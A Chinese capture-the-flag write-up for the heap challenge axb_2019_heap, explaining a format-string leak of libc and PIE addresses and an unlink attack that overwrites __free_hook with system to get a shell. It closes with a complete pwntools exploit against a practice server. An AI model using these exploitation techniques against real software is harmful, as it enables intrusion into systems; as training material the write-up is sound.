# axb_2019_heap（格式化字符串+unlink）
https://bbs.kanxue.com/thread-268868.htm#msg_header_h2_21
## 漏洞分析

### 格式化字符串漏洞

漏洞存在于程序开始要求输入名字的地方，这里有一个格式化字符串漏洞。

**漏洞代码：**
```c
unsigned __int64 banner(){
  char format[12]; // [rsp+Ch] [rbp-14h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Welcome to note management system!");
  printf("Enter your name: ");
  __isoc99_scanf("%s", format);
  printf("Hello, ");
  printf(format);
  puts("\n-------------------------------------");
  return __readfsqword(0x28u) ^ v2;
}
```

由于程序所有保护都已开启，直接传入 GOT 表地址来泄露地址不太方便，除非进行爆破。

## 漏洞利用

### 1. 泄露地址

在 GDB 中 `banner` 函数的 `printf(format)` 处设置断点。

在 GDB 中找到输入变量的存放地址，使用 `fmtarg` 加上地址可以找到基础偏移。然后，计算变量和函数之间的距离。从 GDB 中可以算出十六进制的距离，例如，此处变量距离 `__libc_start_main` 函数是 `0x38`，十进制为 56。因为是 64 位程序，我们除以 8 得到 7。而已知基础偏移是 8，所以可以得到目标偏移为 15。

```bash
pwndbg> fmtarg 0x7fffffffdda0
The index of format argument : 8
pwndbg> stack 30
00:0000│ rsp  0x7fffffffdd90 ◂— 0x0
01:0008│      0x7fffffffdd98 ◂— 0x69616f77ffffddb0
02:0010│      0x7fffffffdda0 ◂— 0x6962616d696e /* 'nimabi' */
03:0018│      0x7fffffffdda8 ◂— 0x64e9de5a09468300
04:0020│ rbp  0x7fffffffddb0 —▸ 0x7fffffffddd0 —▸ 0x555555555200 (__libc_csu_init) ◂— push   r15
05:0028│      0x7fffffffddb8 —▸ 0x555555555186 (main+28) ◂— mov    eax, 0
06:0030│      0x7fffffffddc0 —▸ 0x7fffffffdeb0 ◂— 0x1
07:0038│      0x7fffffffddc8 ◂— 0x0
08:0040│      0x7fffffffddd0 —▸ 0x555555555200 (__libc_csu_init) ◂— push   r15
09:0048│      0x7fffffffddd8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
0a:0050│      0x7fffffffdde0 ◂— 0x1
0b:0058│      0x7fffffffdde8 —▸ 0x7fffffffdeb8 —▸ 0x7fffffffe259 ◂— '/home/q/Desktop/axb_2019_heap'
0c:0060│      0x7fffffffddf0 ◂— 0x1f7ffcca0
0d:0068│      0x7fffffffddf8 —▸ 0x55555555516a (main) ◂— push   rbp
0e:0070│      0x7fffffffde00 ◂— 0x0
```

这里我们需要泄露 `__libc_start_main+240` 和 `main` 函数的地址。

偏移分别为 15 和 19。泄露 `__libc_start_main` 是为了获取 libc 基地址，而泄露 `main` 是为了找到存放 chunk 的数组首地址。

计算 libc 偏移：得到的是 `__libc_start_main+240`，泄露出来后减去 240，再减去 libc 文件中的偏移，就得到了基地址。

### 2. 寻找 chunk 数组地址

这里详细说明如何寻找数组首地址。

首先正常创建一个 chunk，然后用 `vmmap` 查看此时的内存空间。我们先找到 `main` 函数的地址：

```bash
pwndbg> p main
$1 = {<text variable, no debug info>} 0x55992dfc516a <main>
```

使用 `vmmap` 查看内存映射：
```bash

```

可以看到，数据段的起始地址在 `0x55992dfc4000`。
`main` 函数地址为 `0x55992dfc516a`，距离起始地址的偏移为 `0x116a`。

我们要找的是存放 chunk 指针的数组 `note` 的首地址。在 IDA 中可以看到 `note` 在 bss 段，地址为 `0x202060`。
所以，用程序基地址加上这个 bss 段的偏移，就是 `note` 数组在内存中的真实地址。

**计算偏移的脚本部分：**
```python
r.recvuntil("Enter your name: ")
r.sendline('%15$p%19$p')
r.recvuntil('Hello, ')
leak = int(r.recv(14), 16) - 240
print('leak:' + hex(leak))
base = leak - libc.symbols["__libc_start_main"]
sys = base + libc.symbols["system"]
free_hook = base + libc.symbols["__free_hook"]
print('sys:' + hex(sys))
leak1 = int(r.recv(15), 16)
ptr = leak1 - 0x116a + 0x202060
print('leak1' + hex(leak1))
print('bss_ptr:' + hex(ptr))
```

### 3. Unlink

下面进行 unlink 操作。这个环境是 Ubuntu 16，没有 tcache，操作相对方便。

`note` 数组中每个元素包含两项：指向 chunk 内容的指针和 chunk 的大小。

首先构造两个 chunk，`chunk0` 用来写入伪造的 chunk。

```python
add(0, 0x98, 'a'*8) #0
add(1, 0x90, 'b'*8) #1
```

**构造 fake chunk：**
`prev_size` 设为 0，`size` 设为 `0x91`。`fd` 指向 `ptr-0x18`，`bk` 指向 `ptr-0x10`。中间用垃圾数据填充，满足 fake chunk 的大小。然后，将下一个 chunk 的 `prev_size` 改为 fake chunk 的大小，并将 size 的 `PREV_INUSE`位置为 0，以欺骗程序，使其认为上一个 chunk 已经被 free，从而绕过检测。

```python
payload = p64(0) + p64(0x91) + p64(ptr - 0x18) + p64(ptr - 0x10)
payload += p64(0) * 14 + p64(0x90) + "\xa0"
edit(0, payload)
#gdb.attach(r)
delete(1)
```

此时再 `edit(0)` 就是向 `ptr-0x18` 这个空间写入了。但 `ptr` 才是数组首地址。

我们需要先补上之前减去的 `0x18`，用 `p64(0)*3` 即可。然后把指向 chunk 内容的指针改为 `__free_hook` 的地址，大小给一个差不多的值（如 `0x48`）。再把下一个指针指向 `ptr+0x18`（即 `"/bin/sh"` 字符串的地址）。

```python
payload = p64(0)*3 + p64(free_hook) + p64(0x48)
payload += p64(ptr + 0x18) + "/bin/sh\x00"
edit(0, payload)
```

接着，写入 `system` 函数的地址，这相当于更改了 `__free_hook` 的内容。当执行 `free` 时，实际上会执行 `system("/bin/sh")`。

```python
payload = p64(sys)
edit(0, payload)
delete(1)
r.interactive()
```

此时 `note` 数组的内容：
```bash
pwndbg> x/32gx 0x564a7d5a2060
0x564a7d5a2060 <note>:    0x00007f7d004697b8    0x0000000000000048
0x564a7d5a2070 <note+16>:    0x0000564a7d5a2078    0x0068732f6e69622f
0x564a7d5a2080 <note+32>:    0x0000000000000000    0x0000000000000000
0x564a7d5a2090 <note+48>:    0x0000000000000000    0x0000000000000000
0x564a7d5a20a0 <note+64>:    0x0000000000000000    0x0000000000000000
```
远程可以打通。远程环境比较老，libc 没有 double free 检测。本地即使是 Ubuntu 16，新版本也加入了该检测机制。

## 完整 EXP

```python
from pwn import *

#r=process('axb_2019_heap')
r=remote("node4.buuoj.cn",25952)
context.log_level='debug'
elf=ELF('axb_2019_heap')
libc=ELF('./libc-2.23.so')

def add(idx,size,content):
    r.sendlineafter(">> ","1")
    r.recvuntil("(0-10):")
    r.sendline(str(idx))
    r.recvuntil("Enter a size:\n")
    r.sendline(str(size))
    r.recvuntil("Enter the content: \n")
    r.sendline(content)

def edit(idx,content):
    r.sendlineafter(">> ","4")
    r.recvuntil("Enter an index:\n")
    r.sendline(str(idx))
    r.recvuntil("Enter the content: \n")
    r.sendline(content)

def delete(idx):
    r.sendlineafter(">> ","2")
    r.recvuntil("Enter an index:\n")
    r.sendline(str(idx))

r.recvuntil("Enter your name: ")
r.sendline('%15$p%19$p')
r.recvuntil('Hello, ')
leak=int(r.recv(14),16)-240
print('leak:'+hex(leak))
base=leak-libc.symbols["__libc_start_main"]
sys=base+libc.symbols["system"]
free_hook=base+libc.symbols["__free_hook"]
print('sys:'+hex(sys))
#r.recvuntil('0x')
leak1=int(r.recv(15),16)
ptr=leak1-0x116a+0x202060
print('leak1'+hex(leak1))
print('bss_ptr:'+hex(ptr))

add(0,0x98,'a'*8)#0
add(1,0x90,'b'*8)#1

payload=p64(0)+p64(0x91)+p64(ptr-0x18)+p64(ptr-0x10)
payload+=p64(0)*14+p64(0x90)+"\xa0"
edit(0,payload)

delete(1)
#gdb.attach(r)

payload=p64(0)*3+p64(free_hook)+p64(0x48)
payload+=p64(ptr+0x18)+"/bin/sh\x00"
edit(0,payload)

payload=p64(sys)
edit(0,payload)

delete(1)
r.interactive()
```